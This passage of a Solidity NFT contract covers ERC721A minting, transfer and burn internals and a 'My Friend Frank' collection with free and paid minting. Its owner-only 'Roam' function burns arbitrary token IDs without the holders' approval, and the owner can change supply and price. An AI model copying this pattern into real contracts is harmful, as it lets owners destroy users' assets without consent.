1089         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1090         unchecked {
1091             _addressData[to].balance += uint64(quantity);
1092             _addressData[to].numberMinted += uint64(quantity);
1093 
1094             _ownerships[startTokenId].addr = to;
1095             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1096 
1097             uint256 updatedIndex = startTokenId;
1098             uint256 end = updatedIndex + quantity;
1099 
1100             if (safe && to.isContract()) {
1101                 do {
1102                     emit Transfer(address(0), to, updatedIndex);
1103                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1104                         revert TransferToNonERC721ReceiverImplementer();
1105                     }
1106                 } while (updatedIndex != end);
1107                 // Reentrancy protection
1108                 if (_currentIndex != startTokenId) revert();
1109             } else {
1110                 do {
1111                     emit Transfer(address(0), to, updatedIndex++);
1112                 } while (updatedIndex != end);
1113             }
1114             _currentIndex = updatedIndex;
1115         }
1116         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1117     }
1118 
1119     /**
1120      * @dev Transfers `tokenId` from `from` to `to`.
1121      *
1122      * Requirements:
1123      *
1124      * - `to` cannot be the zero address.
1125      * - `tokenId` token must be owned by `from`.
1126      *
1127      * Emits a {Transfer} event.
1128      */
1129     function _transfer(
1130         address from,
1131         address to,
1132         uint256 tokenId
1133     ) private {
1134         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1135 
1136         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1137             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1138             getApproved(tokenId) == _msgSender());
1139 
1140         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1141         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1142         if (to == address(0)) revert TransferToZeroAddress();
1143 
1144         _beforeTokenTransfers(from, to, tokenId, 1);
1145 
1146         // Clear approvals from the previous owner
1147         _approve(address(0), tokenId, prevOwnership.addr);
1148 
1149         // Underflow of the sender's balance is impossible because we check for
1150         // ownership above and the recipient's balance can't realistically overflow.
1151         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1152         unchecked {
1153             _addressData[from].balance -= 1;
1154             _addressData[to].balance += 1;
1155 
1156             _ownerships[tokenId].addr = to;
1157             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1158 
1159             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1160             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1161             uint256 nextTokenId = tokenId + 1;
1162             if (_ownerships[nextTokenId].addr == address(0)) {
1163                 // This will suffice for checking _exists(nextTokenId),
1164                 // as a burned slot cannot contain the zero address.
1165                 if (nextTokenId < _currentIndex) {
1166                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1167                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1168                 }
1169             }
1170         }
1171 
1172         emit Transfer(from, to, tokenId);
1173         _afterTokenTransfers(from, to, tokenId, 1);
1174     }
1175 
1176     /**
1177      * @dev Destroys `tokenId`.
1178      * The approval is cleared when the token is burned.
1179      *
1180      * Requirements:
1181      *
1182      * - `tokenId` must exist.
1183      *
1184      * Emits a {Transfer} event.
1185      */
1186     function _burn(uint256 tokenId) internal virtual {
1187         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1188 
1189         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1190 
1191         // Clear approvals from the previous owner
1192         _approve(address(0), tokenId, prevOwnership.addr);
1193 
1194         // Underflow of the sender's balance is impossible because we check for
1195         // ownership above and the recipient's balance can't realistically overflow.
1196         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1197         unchecked {
1198             _addressData[prevOwnership.addr].balance -= 1;
1199             _addressData[prevOwnership.addr].numberBurned += 1;
1200 
1201             // Keep track of who burned the token, and the timestamp of burning.
1202             _ownerships[tokenId].addr = prevOwnership.addr;
1203             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1204             _ownerships[tokenId].burned = true;
1205 
1206             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1207             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1208             uint256 nextTokenId = tokenId + 1;
1209             if (_ownerships[nextTokenId].addr == address(0)) {
1210                 // This will suffice for checking _exists(nextTokenId),
1211                 // as a burned slot cannot contain the zero address.
1212                 if (nextTokenId < _currentIndex) {
1213                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1214                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1215                 }
1216             }
1217         }
1218 
1219         emit Transfer(prevOwnership.addr, address(0), tokenId);
1220         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1221 
1222         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1223         unchecked {
1224             _burnCounter++;
1225         }
1226     }
1227 
1228     /**
1229      * @dev Approve `to` to operate on `tokenId`
1230      *
1231      * Emits a {Approval} event.
1232      */
1233     function _approve(
1234         address to,
1235         uint256 tokenId,
1236         address owner
1237     ) private {
1238         _tokenApprovals[tokenId] = to;
1239         emit Approval(owner, to, tokenId);
1240     }
1241 
1242     /**
1243      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1244      *
1245      * @param from address representing the previous owner of the given token ID
1246      * @param to target address that will receive the tokens
1247      * @param tokenId uint256 ID of the token to be transferred
1248      * @param _data bytes optional data to send along with the call
1249      * @return bool whether the call correctly returned the expected magic value
1250      */
1251     function _checkContractOnERC721Received(
1252         address from,
1253         address to,
1254         uint256 tokenId,
1255         bytes memory _data
1256     ) private returns (bool) {
1257         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1258             return retval == IERC721Receiver(to).onERC721Received.selector;
1259         } catch (bytes memory reason) {
1260             if (reason.length == 0) {
1261                 revert TransferToNonERC721ReceiverImplementer();
1262             } else {
1263                 assembly {
1264                     revert(add(32, reason), mload(reason))
1265                 }
1266             }
1267         }
1268     }
1269 
1270     /**
1271      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1272      * And also called before burning one token.
1273      *
1274      * startTokenId - the first token id to be transferred
1275      * quantity - the amount to be transferred
1276      *
1277      * Calling conditions:
1278      *
1279      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1280      * transferred to `to`.
1281      * - When `from` is zero, `tokenId` will be minted for `to`.
1282      * - When `to` is zero, `tokenId` will be burned by `from`.
1283      * - `from` and `to` are never both zero.
1284      */
1285     function _beforeTokenTransfers(
1286         address from,
1287         address to,
1288         uint256 startTokenId,
1289         uint256 quantity
1290     ) internal virtual {}
1291 
1292     /**
1293      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1294      * minting.
1295      * And also called after one token has been burned.
1296      *
1297      * startTokenId - the first token id to be transferred
1298      * quantity - the amount to be transferred
1299      *
1300      * Calling conditions:
1301      *
1302      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1303      * transferred to `to`.
1304      * - When `from` is zero, `tokenId` has been minted for `to`.
1305      * - When `to` is zero, `tokenId` has been burned by `from`.
1306      * - `from` and `to` are never both zero.
1307      */
1308     function _afterTokenTransfers(
1309         address from,
1310         address to,
1311         uint256 startTokenId,
1312         uint256 quantity
1313     ) internal virtual {}
1314 }
1315 
1316 
1317 
1318 contract MyFriendFRANK is ERC721A, Owneable {
1319 
1320     string public baseURI = "ipfs://";
1321     string public contractURI = "ipfs://Qmdiz7GyZPzDQCgiqTTVyEQ6vtpxbpZy9E6rGH7BUSQjMd";
1322     string public baseExtension = ".json";
1323     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1324 
1325     uint256 public MAX_PER_TX_FREE = 5;
1326     uint256 public FREE_MAX_SUPPLY = 1111;
1327     uint256 public constant MAX_PER_TX = 10;
1328     uint256 public MAX_SUPPLY = 3333;
1329     uint256 public price = 0.0009 ether;
1330 
1331     bool public paused = true;
1332 
1333     constructor() ERC721A("My Friend Frank", "FRANKENSTEIN") {}
1334 
1335     function mint(uint256 _amount) external payable {
1336         //Feature to be added 2 Franks combined = something amazing.
1337         address _caller = _msgSender();
1338         require(!paused, "Paused");
1339         require(MAX_SUPPLY >= totalSupply() + _amount, "Zapped To Life Has Been Robbed");
1340         require(_amount > 0, "No 0 mints");
1341         require(tx.origin == _caller, "Frank says  No Contracts");
1342         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1343         
1344       if(FREE_MAX_SUPPLY >= totalSupply()){
1345             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1346         }else{
1347             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1348             require(_amount * price == msg.value, "Invalid funds provided");
1349         }
1350 
1351 
1352         _safeMint(_caller, _amount);
1353     }
1354 
1355 
1356 
1357 
1358   
1359 
1360     function isApprovedForAll(address owner, address operator)
1361         override
1362         public
1363         view
1364         returns (bool)
1365     {
1366         // Whitelist OpenSea proxy contract for easy trading.
1367        
1368         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1369         if (address(proxyRegistry.proxies(owner)) == operator) {
1370             return true;
1371         }
1372 
1373         return super.isApprovedForAll(owner, operator);
1374     }
1375 
1376     function Fear() external onlyOwner {
1377         uint256 balance = address(this).balance;
1378         (bool success, ) = _msgSender().call{value: balance}("");
1379         require(success, "Failed to send");
1380     }
1381 
1382     function Reserve(uint256 quantity) external onlyOwner {
1383         _safeMint(_msgSender(), quantity);
1384     }
1385 
1386 
1387     function pause(bool _state) external onlyOwner {
1388         paused = _state;
1389     }
1390 
1391     function setBaseURI(string memory baseURI_) external onlyOwner {
1392         baseURI = baseURI_;
1393     }
1394 
1395     function setContractURI(string memory _contractURI) external onlyOwner {
1396         contractURI = _contractURI;
1397     }
1398 
1399     function configPrice(uint256 newPrice) public onlyOwner {
1400         price = newPrice;
1401     }
1402 
1403 
1404      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1405         MAX_PER_TX_FREE = newFREE;
1406     }
1407 
1408     function configmax_supply(uint256 newSupply) public onlyOwner {
1409         MAX_SUPPLY = newSupply;
1410     }
1411 
1412     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1413         FREE_MAX_SUPPLY = newFreesupply;
1414     }
1415     function newbaseExtension(string memory newex) public onlyOwner {
1416         baseExtension = newex;
1417     }
1418 
1419 
1420 //Future Use
1421         function Roam(uint256[] memory tokenids) external onlyOwner {
1422         uint256 len = tokenids.length;
1423         for (uint256 i; i < len; i++) {
1424             uint256 tokenid = tokenids[i];
1425             _burn(tokenid);
1426         }
1427     }
1428     //Will require 2 Franks to create a unique FREE mint character.
1429 
1430 
1431     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1432         require(_exists(_tokenId), "Token does not exist.");
1433         return bytes(baseURI).length > 0 ? string(
1434             abi.encodePacked(
1435               baseURI,
1436               Strings.toString(_tokenId),
1437               baseExtension
1438             )
1439         ) : "";
1440     }
1441 }
1442 
1443 contract OwnableDelegateProxy { }
1444 contract ProxyRegistry {
1445     mapping(address => OwnableDelegateProxy) public proxies;
1446 }